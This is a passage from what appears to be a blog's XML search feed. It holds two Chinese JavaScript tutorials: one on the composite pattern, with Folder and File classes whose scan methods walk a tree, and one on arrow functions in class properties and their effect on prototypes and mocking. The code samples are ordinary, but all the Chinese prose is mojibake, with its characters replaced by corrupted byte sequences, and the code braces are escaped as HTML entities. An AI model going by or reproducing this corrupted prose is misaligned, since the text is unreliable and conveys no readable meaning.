æ–¹æ³•ï¼Œå¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼ŒæŠ›å‡ºä¸€äº›å¼‚å¸¸æ¥åŠæ—¶æé†’ç”¨æˆ·ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789var openTvCommand = &#123; execute:function()&#123; console.log('æ‰“å¼€ç”µè§†'); &#125;, add:function()&#123; throw new Error( 'å¶å¯¹è±¡ä¸èƒ½æ·»åŠ å­èŠ‚ç‚¹' ); &#125;&#125; openTvCommand.add( macroCommand ) // Uncaught Error: å¶å¯¹è±¡ä¸èƒ½æ·»åŠ å­èŠ‚ç‚¹ æ‰«ææ–‡ä»¶å¤¹æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ä¹‹é—´çš„å…³ç³»ï¼Œéžå¸¸ä½¿ç”¨ç»„åˆæ¨¡å¼æ¥æè¿°ã€‚æ–‡ä»¶å¤¹æ—¢å¯ä»¥åŒ…å«æ–‡ä»¶ï¼Œåˆå¯ä»¥åŒ…å«å…¶ä»–æ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå¯èƒ½ç»„åˆæˆä¸€é¢—æ ‘ï¼Œç»„åˆæ¨¡å¼åœ¨æ–‡ä»¶å¤¹çš„åº”ç”¨ä¸­æœ‰ä¸€ä¸‹ä¸¤å±‚å¥½å¤„ï¼š ä¾‹å¦‚æˆ‘åœ¨åŒäº‹çš„ç§»åŠ¨ç¡¬ç›˜æ‰¾åˆ°äº†ä¸€äº›ç”µå­ä¹¦ï¼Œæƒ³æŠŠå®ƒä»¬å¤åˆ¶åˆ° F ç›˜ä¸­çš„å­¦ä¹ èµ„æ–™æ–‡ä»¶å¤¹ã€‚å¤åˆ¶è¿™äº›ç”µå­ä¹¦çš„æ—¶å€™ï¼Œæˆ‘å¹¶ä¸éœ€è¦è€ƒè™‘è¿™æ‰¹æ–‡ä»¶çš„ç±»åž‹ï¼Œä¸ç®¡å®ƒä»¬æ˜¯å•ç‹¬çš„è¿˜æ˜¯è¢«æ”¾åœ¨äº†æ–‡ä»¶å¤¹ä¸­ã€‚ å½“æˆ‘ä½¿ç”¨æ€æ¯’è½¯ä»¶æ‰«æè¯¥æ–‡ä»¶å¤¹çš„æ—¶å€™ï¼Œå¾€å¾€ä¸ä¼šå…³å¿ƒé‡Œé¢æœ‰å¤šå°‘ä¸ªæ–‡ä»¶å’Œå­æ–‡ä»¶å¤¹ï¼Œç»„åˆæ¨¡å¼ä½¿å¾—æˆ‘ä»¬éœ€è¦æ“ä½œæœ€å¤–å±‚çš„æ–‡ä»¶è¿›è¡Œæ‰«æã€‚ å®šä¹‰å¥½æ–‡ä»¶å¤¹ Folder å’Œ æ–‡ä»¶ File è¿™ä¸¤ä¸ªç±»ï¼š 1234567891011121314151617181920212223var Folder = function(name)&#123; this.name = name; this.files = [];&#125;Folder.prototype.add = function(file)&#123; this.files.push(file);&#125;Folder.prototype.scan = function()&#123; console.log('å¼€å§‹æ‰«ææ–‡ä»¶å¤¹ï¼š'+this.name); for(var i=0,file,files = this.files;file=files[i++])&#123; file.scan(); &#125;&#125;var File = function(name)&#123; this.name = name;&#125;File.prototype.add = function()&#123; throw new Error('æ–‡ä»¶ä¸‹é¢ä¸èƒ½æ·»åŠ æ–‡ä»¶å¤¹');&#125;File.prototype.scan = function()&#123; console.log('å¼€å§‹æ‰«ææ–‡ä»¶:'+this.name);&#125; æŽ¥ä¸‹æ¥åˆ›å»ºä¸€äº›æ–‡ä»¶å¤¹å’Œæ–‡ä»¶å¯¹è±¡ï¼Œå¹¶ä¸”è®©å®ƒä»¬ç»„åˆæˆä¸€æ£µæ ‘ï¼Œè¿™æ£µæ ‘å°±æ˜¯æˆ‘ä»¬ F ç›˜é‡Œé¢çŽ°æœ‰çš„æ–‡ä»¶ç»“æž„ï¼š 12345678910111213var folder = new Folder('å­¦ä¹ èµ„æ–™');var folder1 = new Folder('JavaScript');var folder2 = new Folder('jQuery');var file1 = new File( 'JavaScript è®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µ' ); var file2 = new File( 'ç²¾é€š jQuery' ); var file3 = new File( 'é‡æž„ä¸Žæ¨¡å¼' ) folder1.add(file1);folder2.add(file2);folder.add(folder1);folder.add(folder2);folder.add(file3); çŽ°åœ¨çš„éœ€æ±‚æ˜¯æŠŠç§»åŠ¨ç¡¬ç›˜é‡Œé¢æ–‡ä»¶å’Œæ–‡ä»¶å¤¹éƒ½å¤åˆ¶åˆ°è¿™æ£µæ ‘ä¸­ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»å¾—åˆ°äº†è¿™äº›æ–‡ä»¶å¯¹è±¡ï¼š 1234567var folder3 = new Folder( 'Nodejs' ); var file4 = new File( 'æ·±å…¥æµ…å‡º Node.js' ); folder3.add( file4 ); var file5 = new File( 'JavaScript è¯­è¨€ç²¾é«“ä¸Žç¼–ç¨‹å®žè·µ' ); // æŽ¥ä¸‹æ¥å°±æ˜¯æŠŠè¿™äº›æ–‡ä»¶éƒ½æ·»åŠ åˆ°åŽŸæœ‰çš„æ ‘ä¸­ï¼šfolder.add( folder3 ); folder.add( file5 ); é€šè¿‡è¿™ä¸ªä¾‹å­æˆ‘ä»¬å†æ¬¡çœ‹åˆ°å®¢æˆ·æ˜¯å¦‚ä½•åŒç­‰å¯¹å¾…ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡çš„ã€‚åœ¨æ·»åŠ ä¸€æ‰¹æ–‡ä»¶çš„æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ä¸ç”¨åˆ†è¾¨å®ƒä»¬åˆ°åº•æ˜¯æ–‡ä»¶è¿˜æ˜¯æ–‡ä»¶å¤¹ã€‚æ–°å¢žåŠ çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹éƒ½èƒ½å¤Ÿå¾ˆå®¹æ˜“æ·»åŠ åˆ°åŽŸæ¥çš„æ ‘ç»“æž„ä¸­ï¼Œå’Œæ ‘é‡Œå·²æœ‰çš„å¯¹è±¡ä¸€èµ·å·¥ä½œã€‚ æˆ‘ä»¬æ”¹å˜äº†æ ‘çš„ç»“æž„ï¼Œå¢žåŠ äº†æ–°çš„æ•°æ®ï¼Œå´ä¸ç”¨ä¿®æ”¹ä»»ä½•ä¸€å¥åŽŸæœ‰çš„ä»£ç ï¼Œè¿™æ˜¯ç¬¦åˆå¼€å‘-å°é—­åŽŸåˆ™çš„ã€‚ è¿ç”¨äº†ç»„åˆæ¨¡å¼ä¹‹åŽï¼Œæ‰«ææ•´ä¸ªæ–‡ä»¶å¤¹çš„æ“ä½œä¹Ÿæ˜¯è½»è€Œæ˜“ä¸¾çš„ï¼Œåªéœ€è¦æ“ä½œæœ€é¡¶ç«¯çš„å¯¹è±¡ï¼š 1folder.scan(); æ³¨æ„çš„åœ°æ–¹åœ¨ä½¿ç”¨ç»„åˆæ¨¡å¼çš„æ—¶å€™ï¼Œä¸‹é¢æœ‰ä¸€äº›è¦æ³¨æ„çš„åœ°æ–¹ ç»„åˆæ¨¡å¼ä¸æ˜¯çˆ¶å­å…³ç³» ç»„åˆæ¨¡å¼çš„æ ‘åž‹ç»“æž„å®¹æ˜“è®©äººè¯¯ä»¥ä¸ºç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡æ˜¯çˆ¶å­å…³ç³»ï¼Œè¿™æ˜¯ä¸æ­£ç¡®çš„ã€‚ç»„åˆæ¨¡å¼æ˜¯ä¸€ç§ HAS-A(èšåˆ)çš„å…³ç³»ï¼Œè€Œä¸æ˜¯ IS-Aã€‚ç»„åˆå¯¹è±¡åŒ…å«ä¸€ç»„å¯¹è±¡ï¼Œä½† Leaf å¹¶ä¸æ˜¯ Composite çš„å­ç±»ã€‚ç»„åˆå¯¹è±¡æŠŠè¯·æ±‚å§”æ‰˜ç»™å®ƒæ‰€åŒ…å«çš„æ‰€æœ‰å¶å¯¹è±¡ï¼Œå®ƒä»¬èƒ½å¤Ÿåˆä½œçš„å…³é”®æ˜¯æ‹¥æœ‰åŒæ ·çš„æŽ¥å£ã€‚ å¯¹å¶å¯¹è±¡æ“ä½œçš„ä¸€è‡´æ€§ ç»„åˆæ¨¡å¼è¦æ±‚ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡æ‹¥æœ‰åŒæ ·çš„æŽ¥å£ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå¿…è¦çš„æ¡ä»¶ï¼Œå°±æ˜¯å¯¹ä¸€ç»„å¶å¯¹è±¡çš„æ“ä½œå¿…é¡»å…·æœ‰ä¸€è‡´æ€§ã€‚ åŒå‘æ˜ å°„å…³ç³» å‘é€è¿‡èŠ‚è´¹çš„é€šçŸ¥æ­¥éª¤æ˜¯ä»Žå…¬å¸åˆ°å„ä¸ªéƒ¨é—¨ï¼Œå†åˆ°å„ä¸ªå°ç»„ï¼Œæœ€åŽåˆ°æ¯ä¸ªå‘˜å·¥çš„é‚®ç®±é‡Œã€‚è¿™æœ¬èº«æ˜¯ä¸€ä¸ªç»„åˆæ¨¡å¼çš„å¥½ä¾‹å­ï¼Œä½†è¦è€ƒè™‘çš„ä¸€ç§æƒ…å†µæ˜¯ï¼Œä¹Ÿè®¸æŸä¸ªå‘˜å·¥éš¶å±žå¤šä¸ªç»„ç»‡ç»“æž„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹è±¡ä¹‹é—´çš„å…³ç³»å°±ä¸æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„å±‚æ¬¡ç»“æž„ï¼Œä¸é€‚ç”¨ç”¨ç»„åˆæ¨¡å¼ã€‚ å¯ä»¥ç»™çˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹å»ºç«‹åŒå‘æ˜ å°„å…³ç³»ï¼Œä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯ç»™å°ç»„å’Œæˆå‘˜å¯¹è±¡å¢žåŠ é›†åˆæ¥ä¿å­˜å¯¹æ–¹çš„å¼•ç”¨ã€‚ä½†æ˜¯è¿™ç§ç›¸äº’é—´çš„å¼•ç”¨ç›¸å½“å¤æ‚ï¼Œè€Œä¸”å¯¹è±¡ä¹‹é—´äº§ç”Ÿè¿‡å¤šçš„è€¦åˆæ€§ï¼Œä¿®æ”¹æˆ–è€…åˆ é™¤ä¸€ä¸ªå¯¹è±¡éƒ½å˜å¾—éžå¸¸å›°éš¾ï¼Œæ­¤æ—¶å¯ä»¥ä»‹å…¥ä¸­ä»‹è€…æ¨¡å¼æ¥ç®¡ç†è¿™äº›å¯¹è±¡ã€‚ ç”¨èŒè´£é“¾æ¨¡å¼æé«˜ç»„åˆæ¨¡å¼æ€§èƒ½ åœ¨ç»„åˆæ¨¡å¼ä¸­ï¼Œå¦‚æžœæ ‘çš„ç»“æž„è¿‡äºŽå¤æ‚ï¼ŒèŠ‚ç‚¹æ•°é‡å¾ˆå¤šï¼Œåœ¨éåŽ†æ ‘çš„è¿‡ç¨‹ä¸­ï¼Œæ€§èƒ½è¿‡ç¨‹ä¹Ÿè®¸è¡¨çŽ°å¾—ä¸å¤Ÿç†æƒ³ã€‚æœ‰æ—¶å€™æˆ‘ä»¬ç¡®å®žå¯ä»¥å€ŸåŠ©ä¸€äº›æŠ€å·§ï¼Œåœ¨å®žé™…æ“ä½œä¸­é¿å…éåŽ†æ•´é¢—æ ‘ï¼Œæœ‰ä¸€ç§çŽ°æˆçš„æ–¹æ¡ˆæ˜¯å€ŸåŠ©èŒè´£é“¾æ¨¡å¼ä¸€èˆ¬éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åŽ»è®¾ç½®é“¾æ¡ï¼Œä½†åœ¨ç»„åˆæ¨¡å¼ä¸­ï¼Œçˆ¶å¯¹è±¡å’Œå­å¯¹è±¡ä¹‹é—´å®žé™…ä¸Šå½¢æˆäº†å¤©ç„¶çš„èŒè´£é“¾ã€‚è®©è¯·æ±‚é¡ºç€é“¾æ¡ä»Žçˆ¶å¯¹è±¡å¾€å­å¯¹è±¡ä¼ é€’ï¼Œæˆ–è€…æ˜¯åè¿‡æ¥ã€‚ç›´åˆ°é‡åˆ°å¯ä»¥å¤„ç†è¯¥è¯·æ±‚çš„å¯¹è±¡ä¸ºæ­¢ï¼Œè¿™ä¹Ÿæ˜¯èŒè´£é“¾æ¨¡å¼çš„ç»å…¸è¿ç”¨åœºæ™¯ä¹‹ä¸€ã€‚ å¼•ç”¨çˆ¶å¯¹è±¡ç»„åˆå¯¹è±¡ä¿å­˜äº†å®ƒä¸‹é¢çš„å­èŠ‚ç‚¹çš„å¼•ç”¨ï¼Œè¿™æ˜¯ç»„åˆæ¨¡å¼çš„ç‰¹ç‚¹ï¼Œæ­¤æ—¶ç»“æž„æ˜¯ä»Žä¸Šè‡³ä¸‹çš„ã€‚ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å­èŠ‚ç‚¹ä¿æŒå¯¹çˆ¶èŠ‚ç‚¹çš„å¼•ç”¨ã€‚æ¯”å¦‚åœ¨ç»„åˆæ¨¡å¼ä¸­ä½¿ç”¨èŒè´£é“¾çš„æ—¶å€™ã€‚è¿˜æœ‰å½“æˆ‘ä»¬åˆ é™¤æŸä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå®žé™…ä¸Šæ˜¯ä»Žè¿™ä¸ªæ–‡ä»¶æ‰€åœ¨çš„ä¸Šå±‚æ–‡ä»¶å¤¹åˆ é™¤è¯¥æ–‡ä»¶çš„ã€‚ çŽ°åœ¨æ¥æ”¹å†™æ‰«ææ–‡ä»¶å¤¹çš„ä»£ç ï¼š 1234567891011121314151617181920var Folder = function(name)&#123; this.name = name; this.parent = null; // å¢žåŠ çˆ¶èŠ‚ç‚¹å±žæ€§ this.files = [];&#125;Folder.prototype.add = function(file)&#123; file.parent = this; // è®¾ç½®çˆ¶å¯¹è±¡ this.files.push(file);&#125;Folder.prototype.remove = function()&#123; if(!this.parent)&#123; return; // æ ¹èŠ‚ç‚¹æˆ–è€…æ ‘å¤–çš„æ¸¸ç¦»èŠ‚ç‚¹ &#125; for(var files = this.parent.files,l=files.length-1;l&gt;=0;l--)&#123; var file = files[l]; if(file === this)&#123; files.splice(l,1); &#125; &#125;&#125; åœ¨ File.prototype.remove æ–¹æ³•é‡Œï¼Œé¦–å…ˆä¼šåˆ¤æ–­ this.parentï¼Œå¦‚æžœ this.parent ä¸º nullï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å¤¹è¦ä¹ˆæ˜¯æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¦ä¹ˆæ˜¯è¿˜æ²¡æœ‰æ·»åŠ åˆ°æ ‘çš„æ¸¸ç¦»èŠ‚ç‚¹ï¼Œè¿™æ—¶å€™æ²¡æœ‰èŠ‚ç‚¹éœ€è¦ä»Žæ ‘ä¸­ç§»é™¤ï¼Œæˆ‘ä»¬æš‚ä¸”è®© remove æ–¹æ³•ç›´æŽ¥ returnï¼Œè¡¨ç¤ºä¸åšä»»ä½•æ“ä½œã€‚ å¦‚æžœ this.parent ä¸ä¸º nullï¼Œåˆ™è¯´æ˜Žè¯¥æ–‡ä»¶å¤¹æœ‰çˆ¶èŠ‚ç‚¹å­˜åœ¨ï¼Œæ­¤æ—¶éåŽ†çˆ¶èŠ‚ç‚¹ä¸­ä¿å­˜çš„å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œåˆ é™¤æƒ³è¦åˆ é™¤çš„å­èŠ‚ç‚¹. File ç±»çš„å®žçŽ°åŸºæœ¬ä¸€è‡´: 123456789101112131415161718192021var File = function(name)&#123; this.parent = null; // å¢žåŠ çˆ¶èŠ‚ç‚¹å±žæ€§ this.name = name;&#125;File.prototype.add = function()&#123; throw new Error('æ–‡ä»¶ä¸‹é¢ä¸èƒ½æ·»åŠ æ–‡ä»¶å¤¹');&#125;File.prototype.remove = function()&#123; if(!this.parent)&#123; return; // æ ¹èŠ‚ç‚¹æˆ–è€…æ ‘å¤–çš„æ¸¸ç¦»èŠ‚ç‚¹ &#125; for(var files = this.parent.files,l=files.length-1;l&gt;=0;l--)&#123; var file = files[l]; if(file === this)&#123; files.splice(l,1); &#125; &#125;&#125;File.prototype.scan = function()&#123; console.log('å¼€å§‹æ‰«ææ–‡ä»¶:'+this.name);&#125; ä½•æ—¶ä½¿ç”¨ç»„åˆæ¨¡å¼ç»„åˆæ¨¡å¼è¿ç”¨å¾—å½“çš„è¯ï¼Œå¯ä»¥å¤§å¤§ç®€åŒ–å®¢æˆ·ä»£ç ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œç»„åˆæ¨¡å¼é€‚ç”¨äºŽä¸‹é¢ä¸¤ç§æƒ…å†µï¼š è¡¨ç¤ºå¯¹è±¡çš„éƒ¨åˆ†-æ•´ä½“å±‚æ¬¡ç»“æž„ã€‚ç»„åˆæ¨¡å¼å¯ä»¥æ–¹ä¾¿åœ°æž„é€ ä¸€æ£µæ ‘æ¥è¡¨ç¤ºå¯¹è±¡çš„éƒ¨åˆ†-æ•´ä½“ç»“æž„ã€‚ç‰¹åˆ«æ˜¯æˆ‘ä»¬åœ¨å¼€å‘æœŸé—´ä¸ç¡®å®šè¿™æ£µæ ‘åˆ°åº•å­˜åœ¨å¤šå°‘å±‚æ¬¡çš„æ—¶å€™ã€‚åœ¨æ ‘çš„æž„é€ æœ€ç»ˆå®Œæˆä¹‹åŽï¼Œéœ€è¦é€šè¿‡è¯·æ±‚æ ‘çš„æœ€é¡¶å±‚å¯¹è±¡ï¼Œä¾¿èƒ½å¯¹æ•´æ£µæ ‘åšç»Ÿä¸€çš„æ“ä½œã€‚åœ¨ç»„åˆæ¨¡å¼ä¸­å¢žåŠ å’Œåˆ é™¤æ ‘çš„èŠ‚ç‚¹éžå¸¸æ–¹ä¾¿ï¼Œå¹¶ä¸”ç¬¦åˆå¼€å‘-å°é—­çš„åŽŸåˆ™ã€‚ å®¢æˆ·å¸Œæœ›ç»Ÿä¸€å¯¹å¾…æ ‘ä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚ç»„åˆæ¨¡å¼å¯ä»¥ä½¿å®¢æˆ·å¿½ç•¥ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡çš„åŒºåˆ«ï¼Œå®¢æˆ·åœ¨é¢å¯¹è¿™é¢—æ ‘çš„æ—¶å€™ï¼Œä¸ç”¨å…³å¿ƒç›®å‰æ­£åœ¨å¤„ç†çš„å¯¹è±¡æ˜¯ç»„åˆè¿˜æ˜¯å¶å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¸ç”¨å†™ä¸€å † ifã€else æ¥åˆ¤æ–­å®ƒä»¬ã€‚ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡å„è‡ªåšè‡ªå·±æ­£ç¡®çš„äº‹æƒ…ï¼Œè¿™æ˜¯ç»„åˆæ¨¡å¼æœ€é‡è¦çš„èƒ½åŠ›ã€‚ å°ç»“æˆ‘ä»¬äº†è§£äº†ç»„åˆæ¨¡å¼åœ¨ JavaScript å¼€å‘ä¸­çš„åº”ç”¨ã€‚ç»„åˆæ¨¡å¼å¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨æ ‘å½¢æ–¹å¼åˆ›å»ºå¯¹è±¡çš„ç»“æž„ã€‚æˆ‘ä»¬æŠŠç›¸åŒçš„æ“ä½œåº”ç”¨åœ¨ç»„åˆå¯¹è±¡å’Œå•ä¸ªå¯¹è±¡ä¸Šé¢ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥å¿½ç•¥æŽ‰ç»„åˆå¯¹è±¡å’Œå•ä¸ªå¯¹è±¡ä¹‹é—´çš„å·®åˆ«ï¼Œä»Žè€Œç”¨ä¸€è‡´çš„æ–¹æ³•æ¥å¤„ç†å®ƒä»¬ã€‚ ç„¶åŽï¼Œç»„åˆæ¨¡å¼å¹¶ä¸æ˜¯å®Œç¾Žçš„ï¼Œå®ƒå¯èƒ½ä¼šæœ‰ä¸€ä¸ªè¿™æ ·çš„ç³»ç»Ÿï¼šç³»ç»Ÿä¸­çš„æ¯ä¸ªå¯¹è±¡çœ‹èµ·æ¥éƒ½ä¸Žå…¶ä»–å¯¹è±¡å·®ä¸å¤šã€‚å®ƒä»¬çš„åŒºåˆ«åªæœ‰åœ¨è¿è¡Œçš„æ—¶å€™æ‰ä¼šæ˜¾çŽ°å‡ºæ¥ï¼Œè¿™ä¼šä½¿å¾—ä»£ç éš¾ä»¥ç†è§£ã€‚æ­¤å¤–ï¼Œå¦‚æžœé€šè¿‡ç»„åˆæ¨¡å¼åˆ›å»ºäº†å¤ªå¯¹çš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™äº›å¯¹è±¡å¯èƒ½ä¼šè®©ç³»ç»Ÿè´Ÿæ‹…ä¸èµ·ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç±»å±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°å¯èƒ½ä¸å¦‚æˆ‘ä»¬æƒ³è±¡çš„é‚£ä¹ˆä¼Ÿå¤§]]></title>
    <url>%2F2019-02-28-%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%A6%82%E6%88%91%E4%BB%AC%E6%83%B3%E8%B1%A1%E4%B8%AD%E9%82%A3%E4%B9%88%E4%BC%9F%E5%A4%A7%EF%BC%88%E8%BD%AC%EF%BC%89.html</url>
    <content type="text"><![CDATA[åŽŸæ–‡åœ°å€ï¼šArrow Functions in Class Properties Might Not Be As Great As We Think ç±»å±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°å¯èƒ½ä¸å¦‚æˆ‘ä»¬æƒ³è±¡çš„é‚£ä¹ˆä¼Ÿå¤§Class Properties Proposalç®€åŒ–äº†æˆ‘ä»¬çš„ç”Ÿæ´»ï¼Œç‰¹åˆ«æ˜¯åœ¨å†…éƒ¨çš„Reactä¸­state ï¼Œç”šè‡³æ˜¯propTypeså’ŒdefaultProps ã€‚ æ— ç±»å±žæ€§ï¼š 12345678910111213141516171819202122class Greeting extends Component &#123; constructor(props)&#123; super(props); this.state = &#123; isLoading:false, &#125; &#125; render()&#123; return( &lt;div&gt;Hello,&#123;this.props.name&#125;&lt;/div&gt; ) &#125;&#125;Greeting.propTypes = &#123; name: PropTypes.String.isRequired,&#125;;Greeting.defaultProps = &#123; name:'Stranger',&#125; æœ‰ç±»å±žæ€§ï¼š 12345678910111213141516171819class Greeting extends Component &#123; static propTypes = &#123; name:PropTypes.String.isRequire, &#125;; static defaultProps =&#123; name: 'Stranger' &#125;; state = &#123; isLoading:false, &#125; render()&#123; return( &lt;div&gt;Hello,&#123;this.props.name&#125;&lt;/div&gt; ) &#125;&#125; æ­¤å¤–ï¼Œç±»å±žæ€§/å±žæ€§åˆå§‹åŒ–å™¨åœ¨è¿‡åŽ»ï¼ˆ2017å¹´11æœˆ16æ—¥ï¼‰å…­ä¸ªæœˆä¸­ä¼¼ä¹Žæ›´è¶‹å‘äºŽå¤„ç† React ä¸­çš„ç»‘å®šè€Œä¸æ˜¯æž„é€ å‡½æ•°ä¸­çš„ç»‘å®šè°ƒç”¨ã€‚ ç±»å±žæ€§ä¸­ç®­å¤´å‡½æ•°çš„ç”¨æ³•ï¼š 123456789class ComponentA extends Component&#123; handleClick = () =&gt;&#123; // ... &#125; render()&#123; // ... &#125;&#125; ç±»å­—æ®µå±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°çœ‹èµ·æ¥ä¼¼ä¹Žéžå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šè‡ªåŠ¨ç»‘å®šï¼Œä¸éœ€è¦åŠ  this.handleClick = this.handleClick.bind(this) åœ¨æž„é€ å™¨ä¸­ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬åº”è¯¥åœ¨ç±»å±žæ€§ä¸­è¿ç”¨ç®­å¤´å‡½æ•°å—ï¼Ÿé¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ç±»å±žæ€§çš„ä½œç”¨ã€‚ ä¸ºä»€ä¹ˆç±»å±žæ€§çœ‹èµ·æ¥åƒæ›¾ç»è½¬åŒ–ä¸º ES2017è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç®€å•çš„ç±»ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªé™æ€å±žæ€§ã€ä¸€ä¸ªå®žä¾‹å±žæ€§ã€ä¸€ä¸ªå±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°ï¼Œä»¥åŠä¸€ä¸ªé€šå¸¸ä½œä¸ºæ’ä»¶æ–¹æ³•çš„å‡½æ•°transform-class-properties 12345678910111213class A &#123; static color = 'red'; counter = 0; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125; ä¸€æ—¦æˆ‘ä»¬è¿›å…¥ Babel REPL ç”¨ä¸‹é¢çš„é¢„è®¾å°†ä¸Šé¢çš„ç±»è½¬æ¢ä¸ºES2017çš„ï¼šes2017å’Œstage-2ã€‚ æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸‹é¢çš„è½¬æ¢ç‰ˆæœ¬ï¼š 1234567891011121314class A &#123; constructor()&#123; this.counter = 0; this.handleClick = () =&gt;&#123; this.counter++; &#125; &#125; handleLongClick()&#123; this.counter++; &#125;&#125;A.color = 'red' å¦‚æˆ‘ä»¬æ‰€è§ï¼Œå®žä¾‹å±žæ€§å·²ç»è¢«ç§»åˆ°äº†æž„é€ å‡½æ•°é‡Œé¢ï¼Œè€Œé™æ€å±žæ€§åˆ™è¢«ç§»åˆ°äº†ç±»åŽé¢çš„å£°æ˜Žã€‚ å°±ä½œè€…ä¸ªäººè€Œè¨€ï¼Œä»–å¾ˆå–œæ¬¢åŠ  static å…³é”®å­—ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æŽ¥ export ä½¿ç”¨é™æ€å±žæ€§ã€‚ åœ¨å®žä¾‹å±žæ€§ä¸Šï¼Œå®ƒçš„ä¼˜ç‚¹æ˜¯ä¸ç”¨åœ¨æž„é€ å‡½æ•°ä¸­ç¼–è¯‘å¯¼è‡´å…¶è¿‡äºŽè‡ƒè‚¿ã€‚ å¯¹äºŽå±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°ï¼Œ handleClick ä¹ŸåŒæ ·è¢«ç§»åŠ¨åˆ°äº†æž„é€ å‡½æ•°ï¼Œå°±åƒå®žä¾‹å±žæ€§ä¸€æ ·ã€‚ å¯¹äºŽæˆ‘ä»¬é€šå¸¸å®šä¹‰çš„ handleLongClick æ–¹æ³•åˆ™æ²¡æœ‰ä»»ä½•æ”¹å˜ã€‚ å±žæ€§åˆå§‹åŒ–å™¨å¯èƒ½å¯¹å±žæ€§å¾ˆæœ‰ç”¨ï¼Œä½†æ˜¯å¯¹äºŽç±»å±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°ï¼Œå®ƒå°±åƒæ˜¯å®žçŽ°ç»‘å®šçš„ä¸€ç§è®¾è®¡ä¸è‰¯çš„è§£å†³æ–¹æ³•ã€‚ Mockabilityå¦‚æžœä½ æƒ³åŽ»æ¨¡ä»¿æˆ–è€…æ˜¯ç›‘è§†ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œæœ€ç®€å•è€Œä¸”æœ€æ°å½“çš„æ–¹å¼æ˜¯ä½¿ç”¨åŽŸåž‹ã€‚å› ä¸ºæ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥é€šè¿‡åŽŸåž‹é“¾çœ‹åˆ°å¯¹å¯¹è±¡åŽŸåž‹å¯¹è±¡çš„æ‰€æœ‰æ›´æ”¹ã€‚ å¯¹ä¸Šé¢ä¾‹å­ä¸­çš„ class A è¿›è¡Œä¸€äº›æµ‹è¯•ï¼š 12345678910111213class A &#123; static color = 'red'; counter = 0; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125; A.prototype.handleLongClick è¢«å®šä¹‰äº† A.prototype.handleClick ä¸æ˜¯ä¸€ä¸ªæ–¹æ³• å› ä¸ºæˆ‘ä»¬åœ¨ç±»å±žæ€§ä¸­ä½¿ç”¨äº†ç®­å¤´å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å‡½æ•° handleClickåªåœ¨æž„é€ å‡½æ•°åˆå§‹åŒ–æ—¶å®šä¹‰ï¼Œè€Œä¸æ˜¯åœ¨åŽŸåž‹ä¸­å®šä¹‰ã€‚å› æ­¤æˆ‘ä»¬åœ¨å®žä¾‹åŒ–å¯¹è±¡ä¸­æ¨¡æ‹Ÿæˆ‘ä»¬çš„å‡½æ•°ï¼Œå…¶ä»–å¯¹è±¡ä¹Ÿä¸ä¼šé€šè¿‡åŽŸåž‹é“¾çœ‹åˆ°è¿™äº›æ›´æ”¹ã€‚ Inheritanceå®šä¹‰åŸºæœ¬ç±» A 1234567891011121314151617class A &#123; handleClick = () =&gt;&#123; this.counter++; &#125; handleLongClick()&#123; this.counter++; &#125; &#125;console.log(A.prototype);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;new A().handleClick();// A.handleClicknew A().handleLongClick();// A.handleLongClick å¦‚æžœç±»B ç»§æ‰¿ Aï¼ŒhandleClick 